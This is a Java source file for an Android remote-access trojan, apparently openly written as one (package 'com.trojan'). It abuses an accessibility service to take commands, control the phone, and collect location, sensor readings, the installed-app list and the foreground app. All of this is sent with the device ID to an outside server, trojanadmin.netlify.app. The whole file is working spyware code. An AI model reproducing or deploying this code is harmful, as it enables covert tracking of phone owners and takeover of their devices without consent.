package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.os.BatteryManager;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {

    private static final String TAG = "PowerService";

    // --- Action strings (no changes here) ---
    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.ACTION_GET_CURRENT_APP";
    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.ACTION_OPEN_APP";
    public static final String ACTION_TRIGGER_NAV_BACK = "com.trojan.ACTION_NAV_BACK";
    public static final String ACTION_TRIGGER_NAV_HOME = "com.trojan.ACTION_NAV_HOME";
    public static final String ACTION_TRIGGER_NAV_RECENTS = "com.trojan.ACTION_NAV_RECENTS";
    public static final String ACTION_TRIGGER_WAKE_DEVICE = "com.trojan.ACTION_WAKE_DEVICE";
    public static final String ACTION_TRIGGER_TOGGLE_WIFI = "com.trojan.ACTION_TOGGLE_WIFI";
    public static final String ACTION_TRIGGER_TOGGLE_BLUETOOTH = "com.trojan.ACTION_TOGGLE_BLUETOOTH";
    public static final String ACTION_TRIGGER_TOGGLE_LOCATION = "com.trojan.ACTION_TOGGLE_LOCATION";
    public static final String ACTION_TRIGGER_GET_LOCATION = "com.trojan.ACTION_GET_LOCATION";
    public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
    public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
    public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";

    // --- URL for submitting data back to the server ---
    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";

    private PowerActionReceiver powerActionReceiver;
    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "";

    private FusedLocationProviderClient fusedLocationClient;
    private SensorManager sensorManager;

    // --- LIFECYCLE METHODS ---

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility Service Connected.");
        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

        powerActionReceiver = new PowerActionReceiver();
        IntentFilter filter = new IntentFilter();
        // Add all actions to the filter
        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
        filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
        filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
        filter.addAction(ACTION_TRIGGER_NAV_HOME); filter.addAction(ACTION_TRIGGER_NAV_RECENTS);
        filter.addAction(ACTION_TRIGGER_WAKE_DEVICE); filter.addAction(ACTION_TRIGGER_TOGGLE_WIFI);
        filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
        filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
        filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_status);

        registerReceiver(powerActionReceiver, filter);
        Log.d(TAG, "PowerActionReceiver registered for all actions.");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        if (powerActionReceiver != null) unregisterReceiver(powerActionReceiver);
        sensorManager.unregisterListener(this);
        return super.onUnbind(intent);
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            lastForegroundAppPkg = event.getPackageName().toString();
        }
    }
    
    @Override
    public void onInterrupt() {}

    // --- BROADCAST RECEIVER ---
    private class PowerActionReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = (intent == null) ? null : intent.getAction();
            if (action == null) return;
            Log.d(TAG, "Received command: " + action);

            switch (action) {
                case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
                case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
                case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                case ACTION_TRIGGER_OPEN_APP:
                    String packageToOpen = intent.getStringExtra("package_name");
                    if (packageToOpen != null) openApp(packageToOpen);
                    break;
                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpDevice(); break;
                case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
                case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
                case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.ACTION_WIFI_SETTINGS); break;
                case ACTION_TRIGGER_TOGGLE_BLUETOOTH: openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
                case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
            }
        }
    }

    // --- SENSOR HANDLING ---
    
    private void getSensorData() {
        // Find the default sensor for each type we're interested in.
        Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        Sensor gyroscope = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
        Sensor magnetometer = sensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD); // NEW: Compass
        
        // Register a listener for each sensor that exists on the device.
        if (accelerometer != null) sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        if (gyroscope != null) sensorManager.registerListener(this, gyroscope, SensorManager.SENSOR_DELAY_NORMAL);
        if (magnetometer != null) sensorManager.registerListener(this, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);
    }
    
    @Override
    public final void onSensorChanged(SensorEvent event) {
        // This callback receives data from any of the registered sensors.
        JSONObject sensorData = new JSONObject();
        String sensorType = "";

        try {
            sensorData.put("x", event.values[0]);
            sensorData.put("y", event.values[1]);
            sensorData.put("z", event.values[2]);
            
            // Determine which sensor the data came from.
            if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
                sensorType = "accelerometer";
            } else if (event.sensor.getType() == Sensor.TYPE_GYROSCOPE) {
                sensorType = "gyroscope";
            } else if (event.sensor.getType() == Sensor.TYPE_MAGNETIC_FIELD) {
                sensorType = "magnetometer_compass"; // NEW: Compass data
            }
            
            if (!sensorType.isEmpty()) {
                submitDataToServer(sensorType, sensorData);
            }
        } catch (JSONException e) {
            Log.e(TAG, "JSON error creating sensor data", e);
        }
        
        // IMPORTANT: We only want one reading, so unregister the listener for this specific sensor
        // to stop receiving further updates and save battery.
        sensorManager.unregisterListener(this, event.sensor);
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {} // Can be ignored
    
    // --- OTHER ACTION IMPLEMENTATIONS (No changes needed below this line) ---
    
    private void openApp(String packageName) {
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntent);
        }
    }
    
    @SuppressLint("WakelockTimeout")
    private void wakeUpDevice() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
        wakeLock.acquire();
        wakeLock.release();
    }

    private void openSettingsPanel(String settingsAction) {
        Intent intent = new Intent(settingsAction);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    @SuppressLint("MissingPermission")
    private void getCurrentLocation() {
        fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
            try {
                if (location != null) {
                    JSONObject locJson = new JSONObject();
                    locJson.put("latitude", location.getLatitude());
                    locJson.put("longitude", location.getLongitude());
                    locJson.put("accuracy", location.getAccuracy());
                    submitDataToServer("location", locJson);
                } else {
                    submitDataToServer("location", "Location not available.");
                }
            } catch (JSONException e) { Log.e(TAG, "JSON error creating location data", e); }
        });
    }
    
    private void getScreenStatus() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
    }
    
    private void getBatteryStatus() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            float batteryPct = (level == -1 || scale == -1) ? 50.0f : level * 100 / (float) scale;
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            String isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL) ? "Yes" : "No";
            try {
                JSONObject batteryJson = new JSONObject();
                batteryJson.put("percentage", batteryPct);
                batteryJson.put("isCharging", isCharging);
                submitDataToServer("battery_status", batteryJson);
            } catch (JSONException e) { Log.e(TAG, "JSON error creating battery data", e); }
        }
    }
    
    private void getAndUploadAppList() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        JSONArray appArray = new JSONArray();
        for (ApplicationInfo app : apps) {
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                try {
                    JSONObject appJson = new JSONObject();
                    appJson.put("appName", app.loadLabel(pm).toString());
                    appJson.put("packageName", app.packageName);
                    appArray.put(appJson);
                } catch (JSONException e) { Log.e(TAG, "Error creating JSON for app", e); }
            }
        }
        submitDataToServer("app_list", appArray);
    }

    private void submitDataToServer(String dataType, Object payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
            return;
        }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
            response -> Log.d(TAG, "Data submitted successfully: " + dataType),
            error -> Log.e(TAG, "Failed to submit data: " + error.toString())
        );
        requestQueue.add(request);
    }
}
